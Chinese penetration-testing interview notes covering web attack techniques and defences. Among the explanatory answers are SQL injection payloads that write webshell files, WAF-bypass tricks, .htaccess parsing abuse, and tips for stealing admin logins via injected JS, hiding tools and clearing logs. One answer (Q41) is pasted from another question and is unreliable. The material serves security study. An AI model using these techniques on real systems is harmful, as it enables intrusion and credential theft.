# 渗透测试面经

## 网安学院

1. 一个网站的渗透测试思路，流程（给你一个网站，怎么做？)

   1. **信息收集**
      a. 服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等）
      b. 网站指纹识别（包括，cms，cdn，证书等），dns记录
      c. whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）
      d. 子域名收集，旁站查询(有授权可渗透)，C段等
      e. google hacking针对化搜索，pdf文件，中间件版本，弱口令扫描等
      f. 扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等
      i. 传输协议，通用漏洞，exp，github源码等

   2. **漏洞挖掘**
      1> 浏览网站，看看网站规模，功能，特点等
      2> 端口，弱口令，目录等扫描
      3> XSS，SQL注入，命令注入，CSRF，cookie安全检测，敏感信息，通信数据传输，暴力破解，任意文件上传，越权访问，未授权访问，目录遍历，文件 包含，重放攻击（短信轰炸），服务器漏洞检测，最后使用漏扫工具等
   3. **漏洞利用 | 权限提升**
      a) mysql提权，serv-u提权，linux内核版本提权等
   4. **清除测试数据 | 输出报告**
      1. 日志、测试数据的清理
      2. 总结，输出渗透测试报告，附修复方案
   5. **复测**
      验证并发现是否有新漏洞，输出报告，归档



2. 一个APP的逆向思路

   [app测试大纲](https://github.com/OWASP/owasp-mstg/)

   1. 代码保护检测
   2. 数据存储安全
   3. 加密算法
   4. 四大组件
   5. 应用规范

3. 简述某一漏洞的原理和渗透手法（SQL注入，XSS，CSRF等）

   (直接回答什么是SQL注入, 类型啊, 如何实现啊, 给个注入命令之类的)

4. 编程语言(python , java , 二进制)

5. WAF绕过

   1，关键字可以用%（只限IIS系列）。比如select，可以 sel%e%ct
   2，通杀的，内联注释，如 /*!select*/
   3，编码，可两次编码
   4，multipart请求绕过，在POST请求中添加一个上传文件，绕过了绝大多数WAF
   5，参数绕过，复制参数，id=1&id=1
   6，内联注释

   ```
   ⼤⼩写转换法 
   ⼲扰字符 /*!*/ 
   编码 base64 unicode hex url ascll 
   复参数 
   ```

6. Kali的使用:

   1. 常用命令=======================================>此处暂略
   2. [集成的工具](https://tools.kali.org/tools-listing)

7. OWASP-TOP10?

   1. 包括那些
   2. 具体介绍一下

8. #### 网络安全事件应急响应（如，一业务主站被挂黑页的处理流程及应对方法）

   1. 取证，登录服务器，备份，检查服务器敏感目录，查毒（搜索后门文件 - 注意文件的时间，用户，后缀等属性），调取日志（系统日志，中间件日志，WAF日 志等）；
   2. 处理，恢复备份（快照回滚，最近一次），确定入侵方法（漏洞检测，并进行修复）
   3. 溯源，查入侵IP，入侵手法（网路攻击事件）的确定等
   4. 记录，归档----预防-事件检测-抑制-根除-恢复-跟踪-记录

9. 提交过的漏洞的概述?

   1. 提交过那些漏洞?
   2. 最深刻的提交漏洞的经历

10. 反问面试官?

    1 贵公司，信息安全部门的规模，发展等
    q2 任职后的工作职责，内容，出差，时间等
    q3 劳动合同（实习生签三方协议和转正问题），是否解决户口
    q4 薪资（税后），奖金，股票期权，福利，活动等

11. python / java反序列化原理和防护

-------------------------暂略----------------------------



12. CRLF 注⼊的原理
    CRLF 注⼊在 OWASP ⾥⾯被称为 HTTP 拆分攻击（HTTP Splitting）CRLF 是” 回⻋ + 换⾏”（rn）的简称，在 HTTP 协议中，HTTP Header 与 HTTP Body 是⽤两个 CRLF 分隔的，浏览器就是根据这两个 CRLF 来取出 HTTP 内容并显示出来。所以，⼀旦我们能够控制 HTTP 消息头中的字符，注⼊⼀些恶意的换⾏

    

13. 12、mysql 的⽹站注⼊，5.0 以上和 5.0 以下有什么区别？
    5.0 以下没有 information_schema 这个系统表，⽆法列表名等，只能暴⼒跑表名。

    5.0 以下是多⽤户单操作，5.0 以上是多⽤户多操作。



14. ### php.ini 可以设置哪些安全特性

    禁⽤ PHP 函数

    允许 include 或打开访问远程资源

    

15. php 的 %00 截断的原理是什么？
    因为在 C 语⾔中字符串的结束标识符 %00 是结束符号，⽽ PHP 就是 C 写的，所以继承了 C 的特性，所以判断为 %00 是结束符号不会继续往后执⾏

    条件：PHP<5.3.29，且 GPC 关闭




16. ### 如何突破注⼊时字符被转义？

    宽字符注⼊

    hex 编码绕过

    

17. ### 在某后台新闻编辑界⾯看到编辑器，应该先做什么？

    查看编辑器的名称版本，然后搜索公开的漏洞。

18. 拿到⼀个 webshell 发现⽹站根⽬录下有. htaccess ⽂件，我们能做什么？
    能做的事情很多，⽤隐藏⽹⻢来举例⼦：

    插⼊

    SetHandler application/x-httpd-php.jpg ⽂件会被解析成. php ⽂件




19. ### **.access 扫出后缀为 asp 的数据库⽂件，访问乱码，** 如何实现到本地利用？

    迅雷下载，直接改后缀为. mdb。

    

20. 提权时选择可读写⽬录，为何尽量不⽤带空格的⽬录？

    因为 exp 执⾏多半需要空格界定参数

    

21. 某服务器有站点 A,B 为何在 A 的后台添加 test ⽤户，访问 B 的后台。发现也添加上了 test ⽤户？

    同数据库

22. 注⼊时可以不使⽤ and 或 or 或 xor，直接 order by 开始注⼊吗？
    and/or/xor，前⾯的 1=1、1=2 步骤只是为了判断是否为注⼊点，如果已经确定是注⼊点那就可以省那步骤去。



23. 某个防注⼊系统，在注⼊时会提示：
    系统检测到你有⾮法注⼊的⾏为。

    已记录您的 ip xx.xx.xx.xx

    时间: 2016:01-23

    提交⻚⾯: test.asp?id=15

    提交内容: and 1=1

    

24. 如何利⽤这个防注⼊系统拿 shell？

    在 URL ⾥⾯直接提交⼀句话，这样⽹站就把你的⼀句话也记录进数据库⽂件了 这个时候可以尝试寻找⽹站的配置⽂件

    直接上菜⼑链接。

    

25. 上传⼤⻢后访问乱码时，有哪些解决办法？

    浏览器中改编码

    

26. 审查上传点的元素有什么意义？

    有些站点的上传⽂件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了

    

27. ⽬标站禁⽌注册⽤户，找回密码处随便输⼊⽤户名提示：“此⽤户不存在”，你觉得这⾥怎样利⽤？
    先爆破⽤户名，再利⽤被爆破出来的⽤户名爆破密码。

    其实有些站点，在登陆处也会这样提示

    所有和数据库有交互的地⽅都有可能有注⼊。

    

    

28. ⽬标站发现某 txt 的下载地址为
    http://www.test.com/down/down.php?fifile=/upwdown/1.txt，你有什么思路？

    这就是传说中的下载漏洞！在 fifile = 后⾯尝试输⼊ index.php 下载他的⾸⻚⽂件，然后在⾸⻚⽂件⾥继续查找其他⽹站的配置⽂件，可以找出⽹站的数据库密码和数据库的地址。

29. 甲给你⼀个⽬标站，并且告诉你根⽬录下存在 /abc/ ⽬录，并且此⽬录下存在编辑器和 admin ⽬录。请问你的想法是？

    直接在⽹站⼆级⽬录 /abc/ 下扫描敏感⽂件及⽬录。

30. 在有 shell 的情况下，如何使⽤ xss 实现对⽬标站的⻓久控制？
    后台登录处加⼀段记录登录账号密码的 js，并且判断是否登录成功，如果登录成功，就把账号密码记录到⼀个⽣僻的路

    径的⽂件中或者直接发到⾃⼰的⽹站⽂件中。(此⽅法适合有价值并且需要深⼊控制权限的⽹络)。

    在登录后才可以访问的⽂件中插⼊ XSS 脚本。

    

31. 后台修改管理员密码处，原密码显示为 *。你觉得该怎样实现读出这个⽤户的密码？

    审查元素 把密码处的 password 属性改成 text 就明⽂显示了

    

32.  ⽬标站⽆防护，上传图⽚可以正常访问，上传脚本格式访问则 403. 什么原因？

    原因很多，有可能 web 服务器配置把上传⽬录写死了不执⾏相应脚本，尝试改后缀名绕过



33. 审查元素得知⽹站所使⽤的防护软件，你觉得怎样做到的？

    在敏感操作被拦截，通过界⾯信息⽆法具体判断是什么防护的时候，F12 看 HTML 体部 ⽐如护卫神就可以在名称那看到内容。

    

34. 在 win2003 服务器中建⽴⼀个 .zhongzi ⽂件夹⽤意何为？

    隐藏⽂件夹，为了不让管理员发现你传上去的⼯具。

35. sql 注⼊有以下两个测试选项，选⼀个并且阐述不选另⼀个的理由：

    A. demo.jsp?id=2+1

    B. demo.jsp?id=2-1

    选 B，在 URL 编码中 + 代表空格，可能会造成混淆

36. 以下链接存在 sql 注⼊漏洞，对于这个变形注⼊，你有什么思路？

    demo.do?DATA=AjAxNg==

    DATA 有可能经过了 base64 编码再传⼊服务器，所以我们也要对参数进⾏ base64 编码才能正确完成测试

37. ### 发现 demo.jsp?uid=110 注⼊点，你有哪⼏种思路获取 webshell，哪种是优选？

    有写⼊权限的，构造联合查询语句使⽤ using INTO OUTFILE，可以将查询的输出重定向到系统的⽂件中，这样去写⼊

    WebShell 使⽤ sqlmap –os-shell 原理和上⾯⼀种相同，来直接获得⼀个 Shell，这样效率更⾼ 通过构造联合查询语句

    得到⽹站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等⽅法上传 Shell

38. ### CSRF 和 XSS 和 XXE 有什么区别，以及修复⽅式？

    **XSS 是跨站脚本攻击**，⽤户提交的数据中可以构造代码来执⾏，从⽽实现窃取⽤户信息等攻击。修复⽅式：对字符实体

    进⾏转义、使⽤ HTTP Only 来禁⽌ JavaScript 读取 Cookie 值、输⼊时校验、浏览器与 Web 应⽤端采⽤相同的字符编

    码。

    **CSRF 是跨站请求伪造攻击**，XSS 是实现 CSRF 的诸多⼿段中的⼀种，是由于没有在关键操作执⾏时进⾏是否由⽤户⾃愿发起的确认。修复⽅式：筛选出需要防范 CSRF 的⻚⾯然后嵌⼊ Token、再次输⼊密码、检验 Referer XXE 是 XML 外部实体注⼊攻击，XML 中可以通过调⽤实体来请求本地或者远程内容，和远程⽂件保护类似，会引发相关安全问题，例如敏感⽂件读取。修复⽅式：XML 解析库在调⽤时严格禁⽌对外部实体的解析。

39. ### CSRF、SSRF 和重放攻击有什么区别？

    CSRF 是跨站请求伪造攻击，由客户端发起 SSRF 是服务器端请求伪造，由服务器发起 重放攻击是将截获的数据包进⾏重放，达到身份认证等⽬的

40. ### 说出⾄少三种业务逻辑漏洞，以及修复⽅式？

    **密码找回漏洞**中存在

    1）密码允许暴⼒破解、

    2）存在通⽤型找回凭证、

    3）可以跳过验证步骤、

    4）找回凭证可以拦包获取

    等⽅式来通过⼚商提供的密码找回功能来得到密码。**身份认证漏洞**中最常⻅的是

    1）会话固定攻击

    2） Cookie 仿冒

    只要得到 Session 或 Cookie 即可伪造⽤户身份。**验证码漏洞**中存在

    1）验证码允许暴⼒破解

    2）验证码可以通过 Javascript 或者改包的⽅法来进⾏绕过

41. ### 圈出下⾯会话中可能存在问题的项，并标注可能会存在的问题？

    ```
    get /ecskins/demo jsp?uid=2016031900&keyword=”hello world”
    HTTP/1.1Host:***.com:82User-Agent:Mozilla/
    5.0 Firefox/40Accept:text/css,/;q=0.1
    Accept-Language:zh-CN;zh;q=0.8;en-US;q=0.5,en;q=0.3
    Referer:http://*******.com/eciop/orderForCC/
    cgtListForCC.htm?zone=11370601&v=145902
    Cookie:myguid1234567890=1349db5fe50c372c3d995709f54c273d;
    uniqueserid=session_OGRMIFIYJHAH5_HZRQOZAMHJ;
    st_uid=N90PLYHLZGJXI-NX01VPUF46W;
    status=True
    Connection:keep-alive
    ```

    ​	有写⼊权限的，构造联合查询语句使⽤ using INTO OUTFILE，可以将查询的输出重定向到系统的⽂件中，这样去写⼊ WebShell 使⽤ sqlmap –os-shell 原理和上⾯⼀种相同，来直接获得⼀个 Shell，这样效率更⾼ 通过构造联合查询语句得到⽹站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等⽅法上传 Shell

    

42. ### sqlmap，怎么对⼀个注⼊点注⼊？

    1）如果是 get 型号，直接，sqlmap -u "诸如点⽹址".

    2) 如果是 post 型诸如点，可以 sqlmap -u "注⼊点⽹址” --data="post 的参数 "

    3）如果是 cookie，X-Forwarded-For 等，可以访问的时候，⽤ burpsuite 抓包，注⼊处⽤号替换，放到⽂件⾥，然后

    sqlmap -r "⽂件地址"

    

43. nmap的使用(扫描方式, 常用命令)



44. sql注入类型?



45. 延时注入如何判断

    ```
    if(ascii(substr(“hello”, 1, 1))=104, sleep(5), 1) 
    ```

46. ### 盲注和延时注⼊的共同点？

    都是⼀个字符⼀个字符的判断

47. ### 如何拿⼀个⽹站的 webshell？

    上传，后台编辑模板，sql 注⼊写⽂件，命令执⾏，代码执⾏， ⼀些已经爆出的 cms 漏洞，⽐如 dedecms 后台可以直接建⽴脚本⽂件，wordpress 上传插件包含脚本⽂件 zip 压缩包等

48. sql 注⼊写⽂件都有哪些函数？

    ```
    select '⼀句话' into outfile '路径'
    select '⼀句话' into dumpfile '路径'
    select '' into dumpfile 'd:\wwwroot\baidu.comvhack.php; 
    ```

49. CSRF防御

    

50. SQL注入防御

    

51. 代码执行, 文件读取, 命令执行都有哪些

    ```
    1）代码执⾏：
    
    eval,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function
    
    2）⽂件读取：
    
    file_get_contents(),highlight_file(),fopen(),read
    
    file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等
    
    3)命令执⾏：
    
    system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()
    ```

52. ### img 标签除了 onerror 属性外，还有其他获取管理员路径的办法吗？

    src 指定⼀个远程的脚本⽂件，获取 referer

53. ### img 标签除了 onerror 属性外，并且 src 属性的后缀名，必须以. jpg 结尾，怎么获取管理员路径。

    1）远程服务器修改 apache 配置⽂件，配置. jpg ⽂件以 php ⽅式来解析 AddType application/x-httpd-php .jpg

54. ### 为什么 aspx ⽊⻢权限⽐ asp ⼤？

    aspx 使⽤的是. net 技术。IIS 中默认不⽀持，ASP 只是脚本语⾔⽽已。⼊侵的时候 asp 的⽊⻢⼀般是 guest 权限… APSX 的⽊⻢⼀般是 users 权限

    

55. 何向服务器写⼊ webshell？



56. 渗透测试常见端口

    1. 数据库端口

       ```
       1433 MSSQL 
       1521 Oracle 
       3306 MySQL 
       5432 PostgreSQL
       ```

    2. 特殊服务

       ```
       443 SSL⼼脏滴⾎
       873 Rsync未授权
       5984 CouchDB http://xxx:5984/_utils/ 
       6379 redis未授权
       7001,7002 WebLogic默认弱⼝令，反序列
       9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执⾏漏洞
       11211 memcache未授权访问
       27017,27018 Mongodb未授权访问
       50000 SAP命令执⾏
       50070,50030 hadoop默认端⼝未授权访问 
       ```

    3. 常用端口类(扫描弱口令, 端口爆破)

       ```
       21 ftp 
       22 SSH
       23 Telnet 
       2601,2604 zebra路由，默认密码zebra
       3389 远程桌⾯ 
       ALL、端⼝合计详情
       21 ftp 
       22 SSH 
       23 Telnet 
       80 web 
       80-89 web 
       161 SNMP 
       389 LDAP 
       443 SSL⼼脏滴⾎以及⼀些web漏洞测试
       445 SMB 512,513,514 Rexec 
       873 Rsync未授权
       1025,111 NFS 
       1433 MSSQL 
       1521 Oracle:(iSqlPlus Port:5560,7778) 
       2082/2083 cpanel主机管理系统登陆 （国外⽤较多）
       2222 DA虚拟主机管理系统登陆 （国外⽤较多）
       2601,2604 zebra路由，默认密码zebra
       3128 squid代理默认端⼝，如果没设置⼝令很可能就直接漫游内⽹了
       3306 MySQL 
       3312/3311 kangle主机管理系统登陆
       3389 远程桌⾯
       4440 rundeck 参考WooYun: 借⽤新浪某服务成功漫游新浪内⽹
       5432 PostgreSQL 
       5900 vnc 
       5984 CouchDB http://xxx:5984/_utils/ 
       6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致⽹站被直接篡改或者作为代理进⼊内⽹
       6379 redis未授权
       7001,7002 WebLogic默认弱⼝令，反序列
       7778 Kloxo主机控制⾯板登录
       8000-9090 都是⼀些常⻅的web端⼝，有些运维喜欢把管理后台开在这些⾮80的端⼝上
       8080 tomcat/WDCP主机管理系统，默认弱⼝令
       8080,8089,9090 JBOSS 
       8083 Vestacp主机管理系统 （国外⽤较多）
       8649 ganglia 
       8888 amh/LuManager 主机管理系统默认端⼝
       9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执⾏漏洞
       10000 Virtualmin/Webmin 服务器虚拟主机管理系统
       11211 memcache未授权访问
       27017,27018 Mongodb未授权访问
       28017 mongodb统计⻚⾯
       50000 SAP命令执⾏
       50070,50030 hadoop默认端⼝未授权访问 
       ```

57. 计算机⽹络从物理层到应⽤层?



58. 清理⽇志要清理哪些



59. ## 为什么参数化查询可以防⽌ SQL 注⼊

    原理:

    使⽤参数化查询数据库服务器不会把参数的内容当作 sql 指令的⼀部分来执⾏，是在数据库完成 sql 指令的编译后才套

    ⽤参数运⾏

    简单的说：参数化能防注⼊的原因在于，语句是语句，参数是参数，参数的值并不是语句的⼀部分，数据库只按语句的语

    义跑

60. ## 盲注是什么？怎么盲注？

    盲注是在 SQL 注⼊攻击过程中，服务器关闭了错误回显，我们单纯通过服务器返回内容的变化来判断是否存在 SQL 注

    ⼊和利⽤的⽅式。盲注的⼿段有两种，⼀个是通过⻚⾯的返回内容是否正确 (boolean-based)，来验证是否存在注⼊。

    ⼀个是通过 sql 语句处理时间的不同来判断是否存在注⼊ (time-based)，在这⾥，可以⽤ benchmark，sleep 等造成延

    时效果的函数，也可以通过构造⼤笛卡⼉积的联合查询表来达到延时的⽬的。

61. ## 宽字节注⼊产⽣原理以及根本原因

    产⽣原理

    在数据库使⽤了宽字符集⽽ WEB 中没考虑这个问题的情况下，在 WEB 层，由于 0XBF27 是两个字符，在 PHP 中⽐如addslash 和 magic_quotes_gpc 开启时，由于会对 0x27 单引号进⾏转义，因此 0xbf27 会变成 0xbf5c27, ⽽数据进⼊

    数据库中时，由于 0XBF5C 是⼀个另外的字符，因此 转义符号会被前⾯的 bf 带着 "吃掉"，单引号由此逃逸出来可以

    ⽤来闭合语句。

    character_set_client (客户端的字符集) 和 character_set_connection (连接层的字符集) 不同，或转换函数如，iconv、

    mb_convert_encoding 使⽤不当。

    

    统⼀数据库、Web 应⽤、操作系统所使⽤的字符集，避免解析产⽣差异，最好都设置为 UTF-8。或对数据进⾏正确的转

    义，如 mysql_real_escape_string+mysql_set_charset 的使⽤。

    

    

    ### 5、SQL ⾥⾯只有 update 怎么利⽤

    **先理解这句 SQL**

    ```
    UPDATE user SET password='MD5($password)', homepage='$homepage' WHERE id='$id'
    ```

    如果此 SQL 被修改成以下形式，就实现了注⼊

    a、修改 homepage 值为` http://xxx.net', userlevel='3`

    之后 SQL 语句变为

    ```
    UPDATE user SET password='mypass', homepage='http://xxx.net', userlevel='3' WHERE id='$id'
    ```

    userlevel 为⽤户级别

    b、修改 password 值为 `mypass)' WHERE username='admin'#`

    之后 SQL 语句变为

    ```
    UPDATE user SET password='MD5(mypass)' WHERE username='admin'#)', homepage='$homepage' WHERE id='$id'
    ```

    c、修改 id 值为 ' OR username='admin' 之后 SQL 语句变为

    ```
    UPDATE user SET password='MD5($password)', homepage='$homepage' WHERE id='' OR username='admin'
    ```

    ### 九、SQL 如何写 shell / 单引被过滤怎么办

    写 shell: root 权限，GPC 关闭，知道⽂件路径 outfifile 函数

    `http://127.0.0.1:81/sqli.php?id=1 into outfile 'C:\wamp64\www\phpinfo.php' FIELDS TERMINATED BY '

    (); ?>'`

    `http://127.0.0.1:81/sqli.php?id=-1 union select 1,0x3c3f70687020706870696e666f28293b203f3e,3,4 into outfile 'C:\w

    amp64\www\phpinfo.php'`

    宽字节注⼊

    **1、代替空格的⽅法**

    ```
    %0a、%0b、%a0 等
    /**/ 等注释符
    <>
    ```

    **2、mysql 的⽹站注⼊，5.0 以上和 5.0 以下有什么区别**

    5 0 以下没有 information schema 这个系统表 ⽆法列表名等 只能暴⼒跑表名。5.0 以下没有 information_schema 这个系统表，⽆法列表名等，只能暴⼒跑表名。

    5.0 以下是多⽤户单操作，5.0 以上是多⽤户多操做。

    ### ⼗、XSS

    **1、XSS 原理**

    **反射型**

    ⽤户提交的数据中可以构造代码来执⾏，从⽽实现窃取⽤户信息等攻击。需要诱使⽤户 “点击” ⼀个恶意链接，才能攻击成功

    **存储型**

    存储型 XSS 会把⽤户输⼊的数据 “存储” 在服务器端。这种 XSS 具有很强的稳定性。

    **DOM 型**

    通过修改⻚⾯的 DOM 节点形成的 XSS，称之为 DOM Based XSS。

    **2、DOM 型和反射型的区别**

    反射型 XSS：通过诱导⽤户点击，我们构造好的恶意 payload 才会触发的 XSS。反射型 XSS 的检测我们在每次请求带 payload 的链接时⻚⾯应该是会带有特定的畸形数据的。DOM 型：通过修改⻚⾯的 DOM 节点形成的 XSS。DOM-based XSS 由于是通过 js 代码进⾏ dom 操作产⽣的 XSS，所以在请求的响应中我们甚⾄不⼀定会得到相应的畸形数据。根本区别在我看来是输出点的不同。

    **3、DOM 型和 XSS ⾃动化测试或⼈⼯测试**

    **⼈⼯测试思路：**找到类似 document.write、innerHTML 赋值、outterHTML 赋值、window.location 操作、写 javascript: 后内容、eval、setTimeout 、setInterval 等直接执⾏之类的函数点。找到其变量，回溯变量来源观察是否可控，是否经

    过安全函数。⾃动化测试参看道哥的博客，思路是从输⼊⼊⼿，观察变量传递的过程，最终检查是否有在危险函数输出，中途是否有经过安全函数。但是这样就需要有⼀个 javascript 解析器，否则会漏掉⼀些通过 js 执⾏带⼊的部分内容容。

    在回答这段问题的时候，由于平时对客户的检测中，基本是凭借不同功能点的功能加上经验和直觉来进⾏检测，对不同类型的 XSS 检测⽅式实际上并没有太过细分的标准化检测⽅式，所以回答的很烂。。。

    **4、如何快速发现 XSS 位置**

    **5、对于 XSS 怎么修补建议**

    **输⼊点检查：**对⽤户输⼊的数据进⾏合法性检查，使⽤ fifilter 过滤敏感字符或对进⾏编码转义，针对特定类型数据进⾏格

    式检查。针对输⼊点的检查最好放在服务器端实现。

    **输出点检查：**对变量输出到 HTML ⻚⾯中时，对输出内容进⾏编码转义，输出在 HTML 中时，对其进⾏ HTMLEncode，如果输出在 Javascript 脚本中时，对其进⾏ JavascriptEncode。对使⽤ JavascriptEncode 的变量都放在引号中并转义危险字符，data 部分就⽆法逃逸出引号外成为 code 的⼀部分。还可以使⽤更加严格的⽅法，对所有数字字⺟之外的字符都使⽤⼗六进制编码。此外，要注意在浏览器中，HTML 的解析会优先于 Javascript 的解析，编码的⽅式也需要考虑清楚，针对不同的输出点，我们防御 XSS 的⽅法可能会不同，这点可能在之后的⽂章会做下总结。除此之外，还有做 HTTPOnly 对 Cookie 劫持做限制。

    **6、XSS 蠕⾍的⽣产条件**

    正常情况下，⼀个是产⽣ XSS 点的⻚⾯不属于 self ⻚⾯，⽤户之间产⽣交互⾏为的⻚⾯，都可能造成 XSS Worm 的产⽣。

    **不⼀定需要**存储型 XSS

    ### ⼗⼀、CSRF

    **1、CSRF 原理**

    CSRF 是跨站请求伪造攻击，由客户端发起，是由于没有在关键操作执⾏时进⾏是否由⽤户⾃愿发起的确认

    **2、防御** **

    验证 Referer

    添加 token

    **3、token 和 referer 做横向对⽐，谁安全等级⾼？**

    token 安全等级更⾼，因为并不是任何服务器都可以取得 referer，如果从 HTTPS 跳到 HTTP，也不会发送 referer。并

    且 FLASH ⼀些版本中可以⾃定义 referer。但是 token 的话，要保证其⾜够随机且不可泄露。(不可预测性原则)

    **4、对 referer 的验证，从什么⻆度去做？如果做，怎么杜绝问题**

    对 header 中的 referer 的验证，⼀个是空 referer，⼀个是 referer 过滤或者检测不完善。为了杜绝这种问题，在验证的

    ⽩名单中，正则规则应当写完善。

    **5、针对 token, 对 token 测试会注意哪⽅⾯被⼈，会对 token 的哪⽅⾯进⾏测试？**

    **引⽤⼀段请教前辈的回答：**

    针对 token 的攻击，⼀是对它本身的攻击，重放测试⼀次性、分析加密规则、校验⽅式是否正确等，⼆是结合信息泄露漏洞对它的获取，结合着发起组合攻击

    信息泄露有可能是缓存、⽇志、get，也有可能是利⽤跨站

    很多跳转登录的都依赖 token，有⼀个跳转漏洞加反射型跨站就可以组合成登录劫持了

    另外也可以结合着其它业务来描述 token 的安全性及设计不好怎么被绕过⽐如抢红包业务之类的

    ### ⼗⼀、SSRF

    SSRF (Server-Side Request Forgery: 服务器端请求伪造) 是⼀种由攻击者构造形成由服务端发起请求的⼀个安全漏洞。⼀般情况下，SSRF 攻击的⽬标是从外⽹⽆法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连⽽与外⽹隔离的内部系统）

    SSRF 形成的原因⼤都是由于服务端提供了从其他服务器应⽤获取数据的功能且没有对⽬标地址做过滤与限制。⽐如从指

    定 URL 地址获取⽹⻚⽂本内容，加载指定地址的图⽚，下载等等。

    **1、监测**

    **SSRF 漏洞的验证⽅法：**

    1）因为 SSRF 漏洞是让服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送

    的，从⽽来判断是否存在 SSRF 漏洞

    2）在⻚⾯源码中查找访问的资源地址 ，如果该资源地址类型为 www.baidu.com/xxx.php?image=（地址）的就可能存

    在 SSRF 漏洞 4 [1]

    **2、SSRF 漏洞的成因 防御 绕过**

    成因：模拟服务器对其他服务器资源进⾏请求，没有做合法性验证。利⽤：构造恶意内⽹ IP 做探测，或者使⽤其余所⽀

    持的协议对其余服务进⾏攻击。防御：禁⽌跳转，限制协议，内外⽹限制，URL 限制。绕过：使⽤不同协议，针对 IP，

    IP 格式的绕过，针对 URL，恶意 URL 增添其他字符，@之类的。301 跳转 + dns rebindding。

    ### ⼗⼆、上传

    **1、⽂件上传漏洞原理**

    由于程序员在对⽤户⽂件上传部分的控制不⾜或者处理缺陷，⽽导致⽤户可以越过其本身权限向服务器上传可执⾏的动

    态脚本⽂件

    **2、常⻅的上传绕过⽅式**

    前端 js 验证：禁⽤ js/burp 改包

    ⼤⼩写

    双重后缀名

    过滤绕过 pphphp->php

    **3、防护**

    ⽂件上传⽬录设置为不可执⾏

    使⽤⽩名单判断⽂件上传类型

    ⽤随机数改写⽂件名和路径

    4、审查上传点的元素有什么意义？

    有些站点的上传⽂件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。

    ### ⼗三、⽂件包含

    **1、原理**

    引⼊⼀段⽤户能控制的脚本或代码，并让服务器端执⾏ include () 等函数通过动态变量的⽅式引⼊需要包含的⽂件；⽤户能够控制该动态变量。

    **2、导致⽂件包含的函数**

    PHP：include(), include_once(), require(), re-quire_once(), fopen(), readfifile(), … JSP/Servlet：ava.io.File(),

    java.io.Fil-eReader(), … ASP：include fifile, include virtual,

    **3、本地⽂件包含**

    能够打开并包含本地⽂件的漏洞，被称为本地⽂件包含漏洞

    ### ⼗四、逻辑漏扫

    **1、⾦融⾏业常⻅逻辑漏洞**

    单针对⾦融业务的 主要是数据的篡改 (涉及⾦融数据，或部分业务的判断数据)，由竞争条件或者设计不当引起的薅⽺

    ⽑，交易 / 订单信息泄露，⽔平越权对别⼈的账户查看或恶意操作，交易或业务步骤绕过。

    ### ⼗五、中间⼈攻击

    中间⼈攻击是⼀个（缺乏）相互认证的攻击；由于客户端与服务器之间在 SSL 握⼿的过程中缺乏相互认证⽽造成的漏洞

    防御中间⼈攻击的⽅案通常基于⼀下⼏种技术

    1. 公钥基础建设 PKI 使⽤ PKI 相互认证机制，客户端验证服务器，服务器验证客户端；上述两个例⼦中都是只验证服务

    器，这样就造成了 SSL 握⼿环节的漏洞，⽽如果使⽤相互认证的的话，基本可以更强⼒的相互认证

    1. 延迟测试

    使⽤复杂加密哈希函数进⾏计算以造成数⼗秒的延迟；如果双⽅通常情况下都要花费 20 秒来计算，并且整个通讯花费了 60 秒计算才到达对⽅，这就能表明存在第三⽅中间⼈。

    1. 使⽤其他形式的密钥交换形式

    **ARP 欺骗**

    **原理**

    每台主机都有⼀个 ARP 缓存表，缓存表中记录了 IP 地址与 MAC 地址的对应关系，⽽局域⽹数据传输依靠的是 MAC

    地址。在 ARP 缓存表机制存在⼀个缺陷，就是当请求主机收到 ARP 应答包后，不会去验证⾃⼰是否向对⽅主机发送过

    ARP 请求包，就直接把这个返回包中的 IP 地址与 MAC 地址的对应关系保存进 ARP 缓存表中，如果原有相同 IP 对应关

    系，原有的则会被替换。这样攻击者就有了偷听主机传输的数据的可能

    **防护**

    1. 在主机绑定⽹关 MAC 与 IP 地址为静态（默认为动态），命令：arp -s ⽹关 IP ⽹关 MAC
    2. 在⽹关绑定主机 MAC 与 IP 地址
    3. 使⽤ ARP 防⽕墙

    ### ⼗六、DDOS

    **1、DDOS 原理**

    利⽤合理的请求造成资源过载，导致服务不可⽤

    **syn 洪流的原理**

    伪造⼤量的源 IP 地址，分别向服务器端发送⼤量的 SYN 包，此时服务器端会返回 SYN/ACK 包，因为源地址是伪造的，所以伪造的 IP 并不会应答，服务器端没有收到伪造 IP 的回应，会重试 3～5 次并且等待⼀个 SYNTime（⼀般为 30 秒⾄ 2 分钟），如果超时则丢弃这个连接。攻击者⼤量发送这种伪造源地址的 SYN 请求，服务器端将会消耗⾮常多的资源（CPU 和内存）来处理这种半连接，同时还要不断地对这些 IP 进⾏ SYN+ACK 重试。最后的结果是服务器⽆暇理睬正常的连接请求，导致拒绝服务。

    **CC 攻击原理**

    对⼀些消耗资源较⼤的应⽤⻚⾯不断发起正常的请求，以达到消耗服务端资源的⽬的。

    **2、DOSS 防护**

    SYN Cookie/SYN Proxy、safereset 等算法。SYN Cookie 的主要思想是为每⼀个 IP 地址分配⼀个 “Cookie”，并统计每

    个 IP 地址的访问频率。如果在短时间内收到⼤量的来⾃同⼀个 IP 地址的数据包，则认为受到攻击，之后来⾃这个 IP 地

    址的包将被丢弃。

    ### ⼗七、提权

    **MySQL 两种提权⽅式**

    udf 提权，mof 提权

    **MySQL_UDF 提取**

    要求:

    1. ⽬标系统是 Windows (Win2000,XP,Win2003)；
    2. 拥有 MYSQL 的某个⽤户账号，此账号必须有对 mysql 的 insert 和 delete 权限以创建和抛弃函数
